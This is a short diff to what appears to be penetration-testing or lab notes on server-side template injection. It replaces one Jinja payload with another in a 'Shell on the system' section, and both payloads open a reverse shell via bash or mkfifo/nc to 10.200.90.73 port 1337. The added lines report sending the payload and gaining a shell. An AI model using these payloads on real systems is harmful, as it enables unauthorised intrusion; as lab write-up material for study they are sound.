@@ -158,6 +158,14 @@ When this is chained with something like XSS it can be used to exfil session IDs
 # Shell on the system
 
 ```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i &>/dev/tcp/10.200.90.73/1337 <&1').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.200.90.73 1337 >/tmp/f').read() }}
 ```
+
+Ill send this payload
+
+![](Pasted%20image%2020260903133832.png)
+
+![](Pasted%20image%2020260903133841.png)
+
+Then i now have a shell on the system
 
